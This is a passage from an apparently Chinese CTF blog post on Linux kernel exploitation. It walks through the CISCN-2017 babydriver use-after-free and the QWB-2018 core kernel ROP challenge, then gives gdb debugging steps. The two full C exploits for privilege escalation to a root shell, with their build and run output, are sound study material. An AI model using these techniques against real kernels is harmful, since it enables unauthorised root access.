smep，通常是在访问数据时；</li><li>mmap_min_addr：控制着 mmap 能够映射的最低内存地址。</li></ul><h1 id="Kernel-UAF（CISCN-2017-babydriver）"><a href="#Kernel-UAF（CISCN-2017-babydriver）" class="headerlink" title="Kernel UAF（CISCN-2017-babydriver）"></a>Kernel UAF（CISCN-2017-babydriver）</h1><p>题目中给了三个文件，<code>boot.sh</code>、<code>bzImage</code> 和 <code>rootfs.cpio</code>。<code>bzImage</code> 即为被压缩的内核可执行文件；<code>boot.sh</code> 为 QEMU 的启动脚本：</p><pre><code class="bash">$ tar -xvf babydriver.tarx boot.shx bzImagex rootfs.cpio$ file bzImagebzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu) #1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGA$ bat boot.sh───────┬────────────────────────────────────────────────────────────────────────       │ File: boot.sh───────┼────────────────────────────────────────────────────────────────────────   1   │ #!/bin/bash   2   │   3   │ qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#39;console       │ =ttyS0 root=/dev/ram oops=panic panic=1&#39; -enable-kvm -monitor /dev/null       │  -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep───────┴────────────────────────────────────────────────────────────────────────</code></pre><p>接下来主要看文件系统 <code>rootfs.cpio</code>。用 <code>gunzip</code> 对其进行解压缩，可以看到用的是 4.4.72 的内核，然后可以看到根目录下有一个 init 启动脚本，用来设置 flag 的相关权限和安装 babydriver 模块。也就是说只有变成 root 才能查看 flag：</p><pre><code class="bash">$ file rootfs.cpiorootfs.cpio: gzip compressed data, last modified: Tue Jul  4 08:39:15 2017, max compression, from Unix$ mv rootfs.cpio rootfs.cpio.gz$ gunzip ./rootfs.cpio.gz$ file rootfs.cpiorootfs.cpio: ASCII cpio archive (SVR4 with no CRC)$ mkdir fs &amp;&amp; cd fs$ cpio -idmv &lt; ../rootfs.cpio.etcetc/init.detc/passwdetc/groupbin...initprocliblib/moduleslib/modules/4.4.72lib/modules/4.4.72/babydriver.kosysusr...tmplinuxrchomehome/ctf5556 blocks$ bat init───────┬────────────────────────────────────────────────────────────────────────       │ File: init───────┼────────────────────────────────────────────────────────────────────────   1   │ #!/bin/sh   2   │   3   │ mount -t proc none /proc   4   │ mount -t sysfs none /sys   5   │ mount -t devtmpfs devtmpfs /dev   6   │ chown root:root flag   7   │ chmod 400 flag   8   │ exec 0&lt;/dev/console   9   │ exec 1&gt;/dev/console  10   │ exec 2&gt;/dev/console  11   │  12   │ insmod /lib/modules/4.4.72/babydriver.ko  13   │ chmod 777 /dev/babydev  14   │ echo -e &quot;\nBoot took $(cut -d&#39; &#39; -f1 /proc/uptime) seconds\n&quot;  15   │ setsid cttyhack setuidgid 1000 sh  16   │  17   │ umount /proc  18   │ umount /sys  19   │ poweroff -d 0  -f  20   │───────┴────────────────────────────────────────────────────────────────────────</code></pre><p>接下来看 <code>babydriver.ko</code> 的相关保护，和 ELF 是类似的这里只开了 NX：</p><pre><code class="bash">$ file babydriver.kobabydriver.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=8ec63f63d3d3b4214950edacf9e65ad76e0e00e7, not stripped$ checksec ./babydriver.ko    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x0)</code></pre><p>接下来进 IDA 看看有哪些函数。先了解一个<a href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cdev.h#L12" target="_blank" rel="noopener">结构体 <code>cdev</code></a>（每个字符设备都对应一个 <code>cdev</code> 结构的变量）：</p><pre><code class="cpp">struct cdev {    struct kobject kobj; // 每个cdev都是一个kobject    struct module *owner; // owner指向实现驱动的模块    const struct file_operations *ops; // 操纵这个字符设备的方法    struct list_head list; // 与cdev对应的字符设备文件的inode链表头    dev_t dev; // 起始设备编号    unsigned int count; // 设备范围号大小};</code></pre><p>首先是模块的入口函数 <code>babydriver_init</code>，主要是一系列对 <code>/dev/babydev</code> 设备的注册：</p><pre><code class="cpp">int __cdecl babydriver_init(){  int v0; // edx  __int64 v1; // rsi  int v2; // ebx  class *v3; // rax  __int64 v4; // rax  if ( (signed int)alloc_chrdev_region(&amp;babydev_no, 0LL, 1LL, &quot;babydev&quot;) &gt;= 0 ) // 动态分配设备编号  {    cdev_init(&amp;cdev_0, &amp;fops); // 静态初始化cdev    v1 = babydev_no;    cdev_0.owner = &amp;_this_module; // 设置owner为指定模块    v2 = cdev_add(&amp;cdev_0, babydev_no, 1LL); // 将cdev添加到系统中    if ( v2 &gt;= 0 )    {      v3 = (class *)_class_create(&amp;_this_module, &quot;babydev&quot;, &amp;babydev_no); // 将babydev注册到内核中      babydev_class = v3;      if ( v3 )      {        v4 = device_create(v3, 0LL, babydev_no, 0LL, &quot;babydev&quot;); // 创建设备节点        v0 = 0;        if ( v4 ) // 创建成功          return v0;        printk(&amp;unk_351, 0LL); // 创建设备节点失败        class_destroy(babydev_class); // 取消注册      }      else // 注册失败      {        printk(&amp;unk_33B, &quot;babydev&quot;);      }      cdev_del(&amp;cdev_0); // 从系统中删除cdev    }    else // 分配失败    {      printk(&amp;unk_327, v1);    }    unregister_chrdev_region(babydev_no, 1LL); // 释放设备号    return v2;  }  printk(&amp;unk_309, 0LL);  return 1;}</code></pre><p>然后在模块退出函数中对设备等进行删除和释放资源：</p><pre><code class="cpp">void __cdecl babydriver_exit(){  device_destroy(babydev_class, babydev_no);  class_destroy(babydev_class);  cdev_del(&amp;cdev_0);  unregister_chrdev_region(babydev_no, 1LL);}</code></pre><p>在 <code>babyioctl</code> 中可以看到模块中有一个结构体 <code>babydev_struct</code>。首先调用 <code>kfree</code> 释放对应的 <code>device_buf</code>，然后调用 <code>kmalloc</code> 指定大小的内存，并设置 <code>device_buf_len</code>：</p><pre><code class="cpp">// local variable allocation has failed, the output may be wrong!__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg){  size_t v3; // rdx  size_t len; // rbx  __int64 result; // rax  _fentry__(filp, *(_QWORD *)&amp;command, arg);  len = v3;  if ( command == 0x10001 )  {    kfree(babydev_struct.device_buf);    babydev_struct.device_buf = (char *)_kmalloc(len, 0x24000C0LL);    babydev_struct.device_buf_len = len;    printk(&quot;alloc done\n&quot;, 0x24000C0LL);    result = 0LL;  }  else  {    printk(&amp;unk_2EB, v3);    result = -22LL;  }  return result;}</code></pre><p>在 <code>babyopen</code> 中打开：</p><pre><code class="cpp">int __fastcall babyopen(inode *inode, file *filp){  _fentry__(inode, filp);  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);  babydev_struct.device_buf_len = 0x40LL;  printk(&quot;device open\n&quot;, 0x24000C0LL);  return 0;}</code></pre><p><code>babyread</code> 中调用 <code>copy_to_user</code> 从 <code>babydev_struct.device_buf</code> 读取指定的字符串到用户空间：</p><pre><code class="cpp">ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset){  size_t v4; // rdx  ssize_t result; // rax  ssize_t v6; // rbx  _fentry__(filp, buffer);  if ( !babydev_struct.device_buf )    return -1LL;  result = -2LL;  if ( babydev_struct.device_buf_len &lt;= v4 )    return result;  v6 = v4;  copy_to_user(buffer);  result = v6;  return result;}</code></pre><p><code>babywrite</code> 调用 <code>copy_from_user</code> 读一段数据到 <code>babydev_struct.device_buf</code> 上：</p><pre><code class="cpp">ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset){  size_t v4; // rdx  ssize_t result; // rax  ssize_t v6; // rbx  _fentry__(filp, buffer);  if ( !babydev_struct.device_buf )    return -1LL;  result = -2LL;  if ( babydev_struct.device_buf_len &lt;= v4 )    return result;  v6 = v4;  copy_from_user();  result = v6;  return result;}</code></pre><p>最后 <code>babyrelease</code> 函数将 <code>device_buf</code> 对应的内存释放：</p><pre><code class="cpp">int __fastcall babyrelease(inode *inode, file *filp){  _fentry__(inode, filp);  kfree(babydev_struct.device_buf);  printk(&quot;device release\n&quot;, filp);  return 0;}</code></pre><p>这里的漏洞在于 <code>babyopen</code> 处没有检查打开了几个设备，存在 Use After Free，具体利用方法如下：</p><ol><li>打开两次 <code>/dev/babydev</code>，第二次的分配会覆盖到第一次分配的内存，然后释放第一次分配的内存；</li><li>创建一个新进程，新进程中的 <code>cred</code> 结构体和之前释放的重叠，也就是修改第二次的 <code>babydev</code> 就能改到新进程的 <code>cred</code> 结构体；</li><li>创建时将第二次的 <code>babydev</code> 改成对应 <code>cred</code> 结构体的大小（如下），然后把对应偏移处的 <code>gid</code> 和 <code>uid</code> 改为 0，就实现了提权到 root。</li></ol><pre><code class="cpp">struct cred {    atomic_t    usage;#ifdef CONFIG_DEBUG_CREDENTIALS    atomic_t    subscribers;    /* number of processes subscribed */    void        *put_addr;    unsigned    magic;#define CRED_MAGIC    0x43736564#define CRED_MAGIC_DEAD    0x44656144#endif    kuid_t        uid;        /* real UID of the task */    kgid_t        gid;        /* real GID of the task */    kuid_t        suid;        /* saved UID of the task */    kgid_t        sgid;        /* saved GID of the task */    kuid_t        euid;        /* effective UID of the task */    kgid_t        egid;        /* effective GID of the task */    kuid_t        fsuid;        /* UID for VFS ops */    kgid_t        fsgid;        /* GID for VFS ops */    unsigned    securebits;    /* SUID-less security management */    kernel_cap_t    cap_inheritable; /* caps our children can inherit */    kernel_cap_t    cap_permitted;    /* caps we&#39;re permitted */    kernel_cap_t    cap_effective;    /* caps we can actually use */    kernel_cap_t    cap_bset;    /* capability bounding set */    kernel_cap_t    cap_ambient;    /* Ambient capability set */#ifdef CONFIG_KEYS    unsigned char    jit_keyring;    /* default keyring to attach requested                     * keys to */    struct key __rcu *session_keyring; /* keyring inherited over fork */    struct key    *process_keyring; /* keyring private to this process */    struct key    *thread_keyring; /* keyring private to this thread */    struct key    *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY    void        *security;    /* subjective LSM security */#endif    struct user_struct *user;    /* real user ID subscription */    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */    struct group_info *group_info;    /* supplementary groups for euid/fsgid */    struct rcu_head    rcu;        /* RCU deletion hook */};</code></pre><p>Exploit：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stropts.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/stat.h&gt;int main() {    int fd1, fd2, pid;    fd1 = open(&quot;/dev/babydev&quot;, 2);    fd2 = open(&quot;/dev/babydev&quot;, 2);    ioctl(fd1, 0x10001, 0xa8); // 修改babydev_struct.device_buf_len的长度为cred结构体的长度    close(fd1); // 释放第一次的内存    pid = fork(); // 创建进程    if (pid &lt; 0) {        puts(&quot;[!] fork error...&quot;);        exit(-1);    } else if (pid == 0) { // 子进程        uint8_t fake_cred[30];        memset(fake_cred, 0, sizeof(fake_cred));        write(fd2, fake_cred, 28);        if (getuid() == 0) {            puts(&quot;[+] get root!&quot;);            system(&quot;/bin/sh&quot;);            exit(0);        }    } else {        wait(NULL);    }    close(fd2);    return 0;}</code></pre><p>因为文件系统中没有 Library，需要静态编译才能正常执行。然后打包新的文件系统后运行 <code>boot.sh</code>：</p><pre><code class="bash">$ makecc -static    exp.c   -o exp$ file ./exp./exp: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=8af26f6763d0d44db98089ae847f6104a4054c93, not stripped$ cd fs/ &amp;&amp; find . | cpio -o --format=newc &gt; ../rootfs.cpio7349 blocks$ cd .. &amp;&amp; sudo ./boot.sh</code></pre><p>使用 lsmod 可以查看加载模块的基地址：</p><pre><code class="bash">/ $ lsmodbabydriver 16384 0 - Live 0xffffffffc0000000 (OE)/ $ iduid=1000(ctf) gid=1000(ctf) groups=1000(ctf)/ $ cat flagcat: can&#39;t open &#39;flag&#39;: Permission denied/ $ /tmp/exp[   23.769095] device open[   23.773231] device open[   23.775415] alloc done[   23.784434] device release[+] get root!/ # iduid=0(root) gid=0(root) groups=1000(ctf)/ # cat flagflag{this_is_a_flag}/ #</code></pre><blockquote><p><a href="http://p4nda.top/2018/10/11/ciscn-2017-babydriver/" target="_blank" rel="noopener">P4nda</a> 以及 <a href="https://www.anquanke.com/post/id/86490" target="_blank" rel="noopener">Anceity</a> 两位大佬都提供了 ROP 的做法。</p></blockquote><h1 id="Kernel-ROP（QWB-2018-core）"><a href="#Kernel-ROP（QWB-2018-core）" class="headerlink" title="Kernel ROP（QWB-2018-core）"></a>Kernel ROP（QWB-2018-core）</h1><p>题目给了四个文件，vmlinux 即为 bzImage 未解压缩的版本（可以用 <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank" rel="noopener"><code>extract-vmlinux</code></a> 来对 <code>bzImage</code> 解压缩）。<code>start.sh</code> 是一个启动脚本，其中可以看到开了 <code>kalsr</code>：</p><pre><code class="bash">$ tar -zxvf core_give.tar.gz./give_to_player/./give_to_player/bzImage./give_to_player/vmlinux./give_to_player/core.cpio./give_to_player/start.sh$ bat start.sh───────┬────────────────────────────────────────────────────────────────────────       │ File: start.sh───────┼────────────────────────────────────────────────────────────────────────   1   │ qemu-system-x86_64 \   2   │ -m 64M \   3   │ -kernel ./bzImage \   4   │ -initrd  ./core.cpio \   5   │ -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;       │  \   6   │ -s  \   7   │ -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \   8   │ -nographic  \</code></pre><p>然后跟前面一样看一下看看文件系统里有啥，<code>init</code> 同样可以得到很多信息，：</p><ul><li>第 9 行把 <code>/proc/kallsyms</code> 的内容保存到了 <code>/tmp/kallsyms</code>，那么就可以从 <code>/tmp/kallsyms</code> 中读取到 <code>commit_creds</code> 和 <code>prepare_kernel_cred</code> 的地址；</li><li>第 10 行把 <code>kptr_restrict</code> 设为 1，禁止通过 <code>/proc/kallsyms</code> 查看函数地址，不过前面已经把其中的信息保存到了一个可读的文件中；</li><li>第 11 行把 <code>dmesg_restrict</code> 设为 1，禁止使用 dmesg；</li><li>第 18 行设置了定时关机，为了避免做题时产生干扰，可以直接把这句删掉然后重新打包。</li></ul><pre><code class="bash">$ file core.cpiocore.cpio: gzip compressed data, last modified: Fri Oct  5 14:08:36 2018, max compression, from Unix$ mv core.cpio core.cpio.gz$ gunzip ./core.cpio.gz$ lscore.cpio$ file ./core.cpio./core.cpio: ASCII cpio archive (SVR4 with no CRC)$ cpio -idmv &lt; ./core.cpio.usrusr/sbin...initetcetc/groupetc/passwdlib64lib64/ld-linux-x86-64.so.2lib64/libc.so.6lib64/libm.so.6...gen_cpio.shbin...vmlinuxrootlinuxrcliblib/modules...tmpcore.cpiocore.ko129851 blocks$ bat init───────┬────────────────────────────────────────────────────────────────────────       │ File: init───────┼────────────────────────────────────────────────────────────────────────   1   │ #!/bin/sh   2   │ mount -t proc proc /proc   3   │ mount -t sysfs sysfs /sys   4   │ mount -t devtmpfs none /dev   5   │ /sbin/mdev -s   6   │ mkdir -p /dev/pts   7   │ mount -vt devpts -o gid=4,mode=620 none /dev/pts   8   │ chmod 666 /dev/ptmx   9   │ cat /proc/kallsyms &gt; /tmp/kallsyms  10   │ echo 1 &gt; /proc/sys/kernel/kptr_restrict  11   │ echo 1 &gt; /proc/sys/kernel/dmesg_restrict  12   │ ifconfig eth0 up  13   │ udhcpc -i eth0  14   │ ifconfig eth0 10.0.2.15 netmask 255.255.255.0  15   │ route add default gw 10.0.2.2  16   │ insmod /core.ko  17   │  18   │ poweroff -d 120 -f &amp;  19   │ setsid /bin/cttyhack setuidgid 1000 /bin/sh  20   │ echo &#39;sh end!\n&#39;  21   │ umount /proc  22   │ umount /sys  23   │  24   │ poweroff -d 0  -f───────┴────────────────────────────────────────────────────────────────────────</code></pre><blockquote><ul><li>可以使用 <code>gen_cpio.sh</code> 重新打包；</li><li>如果不能正常启动，将 QEMU 的内存参数改为 128M。</li></ul></blockquote><p>接下来对模块文件进行分析。可以开导开了 Canary 和 NX：</p><pre><code class="bash">$ file ./core.ko./core.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=54943668385c6573ec1b40a7c06127d9423103b3, not stripped$ checksec ./core.ko    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x0)</code></pre><p>模块入口函数中注册了 <code>/proc/core</code>：</p><pre><code class="cpp">__int64 init_module(){  core_proc = proc_create(&quot;core&quot;, 438LL, 0LL, &amp;core_fops);  printk(&amp;unk_2DE);  return 0LL;}</code></pre><p>在退出函数中删除 <code>/proc/core</code>：</p><pre><code class="cpp">__int64 exit_core(){  __int64 result; // rax  if ( core_proc )    result = remove_proc_entry(&quot;core&quot;);  return result;}</code></pre><p>在 <code>core_ioctl</code> 中有一条 Switch 语句，分别对应 <code>core_read</code>、设置全局变量 <code>off</code> 的值以及 <code>core_copy_func</code>：</p><pre><code class="cpp">__int64 __fastcall core_ioctl(__int64 a1, int c, __int64 data_1){  __int64 data; // rbx  data = data_1;  switch ( c )  {    case 0x6677889B:      core_read(data_1);      break;    case 0x6677889C:      printk(&amp;unk_2CD);      off = data;      break;    case 0x6677889A:      printk(&amp;unk_2B3);      core_copy_func(data);      break;  }  return 0LL;}</code></pre><p><code>core_read</code> 从 <code>v5+off</code> 的位置复制 0x40 个字节到用户空间，也就是可以进行任意读：</p><pre><code class="cpp">unsigned __int64 __fastcall core_read(__int64 a1){  __int64 v1; // rbx  char *v2; // rdi  signed __int64 i; // rcx  unsigned __int64 result; // rax  char v5; // [rsp+0h] [rbp-50h]  unsigned __int64 v6; // [rsp+40h] [rbp-10h]  v1 = a1;  v6 = __readgsqword(0x28u);  printk(&amp;unk_25B);  printk(&amp;unk_275);  v2 = &amp;v5;  for ( i = 0x10LL; i; --i )  {    *(_DWORD *)v2 = 0; // memset(v2, 0, sizeof(v2))    v2 += 4;  }  strcpy(&amp;v5, &quot;Welcome to the QWB CTF challenge.\n&quot;);  result = copy_to_user(v1, &amp;v5 + off, 0x40LL);  if ( !result )    return __readgsqword(0x28u) ^ v6;  __asm { swapgs }  return result;}</code></pre><p><code>core_copy_func</code> 则是从全局变量 <code>name</code> 中复制指定长度的内容到局部变量 <code>buf</code> 上。且传入的长度是有符号整型 <code>signed __int64</code>，而 <code>qmemcpy</code> 的长度使用的是无符号整型 <code>unsigned __int16</code>，可以通过溢出来绕过前面的检查：</p><pre><code class="cpp">signed __int64 __fastcall core_copy_func(signed __int64 len){  signed __int64 result; // rax  __int64 buf; // [rsp+0h] [rbp-50h]  unsigned __int64 v3; // [rsp+40h] [rbp-10h]  v3 = __readgsqword(0x28u);  printk(&amp;unk_215);  if ( len &gt; 0x3F )  {    printk(&amp;unk_2A1);    result = 0xFFFFFFFFLL;  }  else  {    result = 0LL;    qmemcpy(&amp;buf, &amp;name, (unsigned __int16)len);  }  return result;}</code></pre><p><code>core_write</code> 往全局变量 <code>name</code> 上写指定内容：</p><pre><code class="cpp">signed __int64 __fastcall core_write(__int64 a1, __int64 buf, unsigned __int64 a3){  unsigned __int64 len; // rbx  len = a3;  printk(&amp;unk_215);  if ( len &lt;= 0x800 &amp;&amp; !copy_from_user(&amp;name, buf, len) )    return (unsigned int)len;  printk(&amp;unk_230);  return 0xFFFFFFF2LL;}</code></pre><p>最后 <code>core_release</code> 只是有一个 printk 输出：</p><pre><code class="cpp">__int64 core_release(){  printk(&amp;unk_204);  return 0LL;}</code></pre><p>综上整理一下不难发现，我们可以任意地址读、可以往一个全局变量和一个函数中的局部变量写，那么就有下面的 ROP 思路：</p><ol><li>使用 <code>ioctl</code> 设置全局变量 <code>off</code>，然后调用 <code>core_read</code> 来泄漏 Canary；</li><li>使用 <code>core_write</code> 向 <code>name</code> 写入 ROP 链（构造 <code>commit_creds(prepare_kernel_cred(0))</code>，地址通过 <code>/tmp/kallsyms</code> 中的内容获取）；</li><li>使用 <code>core_copy_func</code> 把 <code>name</code> 上构造的 ROP 链写到局部变量上；</li><li>最后返回用户态调用 <code>system(&quot;/bin/sh&quot;)</code>（通过 <code>swapgs ; iretq</code> 两条指令来恢复寄存器和返回用户态）。</li></ol><blockquote><p>关于找 Gadget 的方法，M4x 师傅说是用 ropper，但我个人感觉 ROPgadget 更快。</p><pre><code class="bash">$ ROPgadget --binary ./vmlinux &gt; gadgets</code></pre><p><code>ireq</code> 可以用 objdump 来找。</p></blockquote><p>TODO</p><p>Exploit：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;void spawn_shell() {  if (!getuid()) {        system(&quot;/bin/sh&quot;);        exit(0);    } else {        puts(&quot;[!] UID != 0&quot;);        exit(-1);    }}size_t commit_creds, prepare_kernel_cred;size_t raw_vmlinux_base = 0xffffffff81000000;size_t vmlinux_base = 0;size_t find_symbols() {    FILE *kallsyms_fd = fopen(&quot;/tmp/kallsyms&quot;, &quot;r&quot;);    if (kallsyms_fd &lt; 0) {        puts(&quot;[!] Open /tmp/kallsyms error...&quot;);        exit(-1);    }    char buf[0x30];    while(fgets(buf, 0x30, kallsyms_fd)) {        if (commit_creds &amp; prepare_kernel_cred)            return 0;        if (strstr(buf, &quot;commit_creds&quot;) &amp;&amp; !commit_creds) {            char hex[20];            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;commit_creds);            printf(&quot;commit_creds =&gt; %p.\n&quot;, commit_creds);            vmlinux_base = commit_creds - 0x9c8e0;            printf(&quot;vmlinux_base =&gt; %p.\n&quot;, vmlinux_base);        }        if (strstr(buf, &quot;prepare_kernel_cred&quot;) &amp;&amp; !prepare_kernel_cred) {            char hex[20];            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;prepare_kernel_cred);            printf(&quot;prepare_kernel_cred =&gt; %p.\n&quot;, prepare_kernel_cred);            vmlinux_base = prepare_kernel_cred - 0x9cce0;            printf(&quot;vmlinux_base =&gt; %p.\n&quot;, vmlinux_base);        }    }    if (!(prepare_kernel_cred &amp; commit_creds)) {        puts(&quot;[*] Error...&quot;);        exit(-1);    }}size_t user_cs, user_ss, user_rflags, user_sp;void save_status() {    __asm__(        &quot;mov user_cs, cs;\n&quot;        &quot;mov user_ss, ss;\n&quot;        &quot;mov user_sp, sp;\n&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;\n&quot;    );    puts(&quot;[*] User status has been saved.&quot;);}void set_off(int fd, long long idx) {    printf(&quot;[*] Set off = %ld.\n&quot;, idx);    ioctl(fd, 0x6677889C, idx);}void core_read(int fd, char *buf) {    puts(&quot;[*] Read to buf!&quot;);    ioctl(fd, 0x6677889B, buf);}void core_copy_func(int fd, long long size) {    printf(&quot;[*] Copy %ld byte(s) from user.\n&quot;, size);    ioctl(fd, 0x6677889A, size);}uint64_t pop_rdi_ret = 0xffffffff81000b2f;uint64_t pop_rdx_ret = 0xffffffff810a0f49;uint64_t pop_rcx_ret = 0xffffffff81021e53;uint64_t mov_rdi_rax_call_rdx = 0xffffffff8101aa6a;uint64_t swapgs_popfq_ret = 0xffffffff81a012da;uint64_t iretq_ret = 0xffffffff81050ac2;int main() {    save_status();    int fd = open(&quot;/proc/core&quot;, 2);    if(fd &lt; 0) {        puts(&quot;[*] Open /proc/core error...&quot;);        exit(-1);    }    find_symbols();    // gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;    ssize_t offset = vmlinux_base - raw_vmlinux_base;    set_off(fd, 0x40);    char buf[0x40];    core_read(fd, buf);    size_t canary = ((size_t *)buf)[0];    printf(&quot;[+] Canary = %p\n&quot;, canary);    size_t rop[0x1000] = {0};    int i;    for (i = 0; i &lt; 10; i++)        rop[i] = canary;    // prepare_kernel_cred(0)    rop[i++] = pop_rdi_ret + offset;    rop[i++] = 0;    rop[i++] = prepare_kernel_cred;    // ...    rop[i++] = pop_rdx_ret + offset; // pop rdx ; ret    rop[i++] = pop_rcx_ret + offset; // pop rcx ; ret    rop[i++] = mov_rdi_rax_call_rdx + offset; // mov rdi, rax ; call rdx    rop[i++] = commit_creds;    // Restore registers    rop[i++] = swapgs_popfq_ret + offset;    rop[i++] = 0;    rop[i++] = iretq_ret + offset;    rop[i++] = (size_t)spawn_shell; // rip    rop[i++] = user_cs;    rop[i++] = user_rflags;    rop[i++] = user_sp;    rop[i++] = user_ss;    write(fd, rop, 0x800); // Write rop chain    core_copy_func(fd, 0xffffffffffff0000 | (0x100));    return 0;}</code></pre><h1 id="Debug-with-gdb"><a href="#Debug-with-gdb" class="headerlink" title="Debug with gdb"></a>Debug with gdb</h1><p>进行调试的话一般要先在 QEMU 启动脚本中添加 <code>-gdb tcp::1234</code> 参数（<code>-s</code> 参数同理）。然后用 <code>gdb ./vmlinux</code> 启动 GDB（如果没有 <code>vmlinux</code> 需要提前提取）。接下来在 gdb 中添加调试符号：</p><pre><code class="gdb">add-symbol-file /path/to/lkms/example.ko [offset]</code></pre><blockquote><p><code>offset</code> 的值通过在 QEMU 中运行 lsmod 来得到：</p><pre><code class="bash">/ $ lsmodcore 16384 0 - Live 0xffffffffc0211000 (O)</code></pre><p>或者可以修改启动脚本以 root 权限来查看 <code>/sys/module/core/sections/.text</code> 段的值：</p><pre><code class="bash">/ # cat /sys/module/core/sections/.text0xffffffffc0211000</code></pre></blockquote><p>然后就可以 <code>target remote localhost:1234</code> 开始调试了：</p><pre><code class="bash">$ gdb ./vmlinux -qGEF for linux ready, type `gef&#39; to start, `gef config&#39; to configure80 commands loaded for GDB 7.11.1 using Python engine 3.5Reading symbols from ./vmlinux...(no debugging symbols found)...done.gef➤  add-symbol-file fs/core.ko 0xffffffffc027a000add symbol table from file &quot;fs/core.ko&quot; at    .text_addr = 0xffffffffc027a000Reading symbols from fs/core.ko...(no debugging symbols found)...done.gef➤  b core_readBreakpoint 1 at 0xffffffffc027a063gef➤  target remote localhost:1234Remote debugging using localhost:12340xffffffffa6a6e7d2 in ?? ()[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$rax   : 0xffffffffa6a6e7d0  →  0x2e66001f0fc3f4fb  →  0x2e66001f0fc3f4fb$rbx   : 0xffffffffa7410480  →  0x0000000080000000  →  0x0000000080000000$rcx   : 0x0000000000000000  →  0x0000000000000000$rdx   : 0x0000000000000000  →  0x0000000000000000$rsp   : 0xffffffffa7403eb8  →   movabs al, ds:0xc2ffffffffa62b65$rbp   : 0x0000000000000000  →  0x0000000000000000$rsi   : 0x0000000000000000  →  0x0000000000000000$rdi   : 0x0000000000000000  →  0x0000000000000000$rip   : 0xffffffffa6a6e7d2  →  0x1f0f2e66001f0fc3  →  0x1f0f2e66001f0fc3$r8    : 0xffff8d484641bf20  →   (bad)$r9    : 0x0000000000000000  →  0x0000000000000000$r10   : 0x0000000000000000  →  0x0000000000000000$r11   : 0x000000000000018c  →  0x000000000000018c$r12   : 0xffffffffa7410480  →  0x0000000080000000  →  0x0000000080000000$r13   : 0xffffffffa7410480  →  0x0000000080000000  →  0x0000000080000000$r14   : 0x0000000000000000  →  0x0000000000000000$r15   : 0x0000000000000000  →  0x0000000000000000$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0010 $ss: 0x0018 $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000───────────────────────────────────────────────────────────────────── stack ────[!] Unmapped address─────────────────────────────────────────────────────────────── code:x86:64 ────   0xffffffffa6a6e7cf                  nop   0xffffffffa6a6e7d0                  sti   0xffffffffa6a6e7d1                  hlt   0xffffffffa6a6e7d2                  ret   0xffffffffa6a6e7d3                  nop    DWORD PTR [rax]   0xffffffffa6a6e7d6                  nop    WORD PTR cs:[rax+rax*1+0x0]   0xffffffffa6a6e7e0                  mov    rax, QWORD PTR gs:0x14d40   0xffffffffa6a6e7e9                  or     BYTE PTR ds:[rax+0x2], 0x20   0xffffffffa6a6e7ee                  mov    rdx, QWORD PTR [rax]─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, stopped 0xffffffffa6a6e7d2 in ?? (), reason: SIGTRAP───────────────────────────────────────────────────────────────────── trace ────[#0] 0xffffffffa6a6e7d2 → ret[#1] 0xffffffffa62b65a0 → jmp 0xffffffffa62b6541[#2] 0xc2 → irq_stack_union()[#3] 0xffffffffa78c4900 → int3[#4] 0xffff8d48466d4900 → jb 0xffff8d48466d4971[#5] 0xffffffffa78cc2c0 → int3────────────────────────────────────────────────────────────────────────────────gef➤</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/</a><br><a href="http://m4x.fun/post/linux-kernel-pwn-abc-1/" target="_blank" rel="noopener">http://m4x.fun/post/linux-kernel-pwn-abc-1/</a><br><a href="https://richardustc.github.io/2013-05-21-2013-05-21-min-mmap-addr.html" target="_blank" rel="noopener">https://richardustc.github.io/2013-05-21-2013-05-21-min-mmap-addr.html</a><br><a href="https://blog.csdn.net/jhyboss/article/details/76505873" target="_blank" rel="noopener">https://blog.csdn.net/jhyboss/article/details/76505873</a><br><a 